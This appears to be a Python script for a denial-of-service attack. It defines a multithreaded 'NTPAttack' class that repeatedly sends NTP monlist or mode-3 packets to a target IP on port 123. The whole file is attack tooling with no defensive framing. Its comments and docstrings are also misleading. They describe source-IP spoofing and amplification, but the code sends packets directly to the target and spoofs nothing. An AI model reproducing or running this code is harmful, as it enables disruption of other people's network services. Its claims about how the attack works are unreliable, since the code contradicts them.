import socket
import threading

class NTPAttack:
    def __init__(self, target_ip, monlist=True):
        self.target_ip = target_ip
        self.monlist = monlist
        self.running = False
        self.threads = []

    def ntp_amp(self):
        """Send amplified NTP responses to target"""
        if self.monlist:
            payload = b"\x17\x00\x03\x2a" + b"\x00" * 4
        else:
            payload = b"\xe3\x00\x04\xfa\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00" \
                     b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
                     b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        
        while self.running:
            try:
                # Spoof source IP to be the target
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.bind(('0.0.0.0', 0))
                s.sendto(payload, (self.target_ip, 123))
                s.close()
            except:
                pass

    def start(self, threads=10):
        """Start NTP amplification attack"""
        self.running = True
        for _ in range(threads):
            t = threading.Thread(target=self.ntp_amp)
            t.daemon = True
            t.start()
            self.threads.append(t)

    def stop(self):
        """Stop NTP amplification attack"""
        self.running = False
        for t in self.threads:
            t.join()
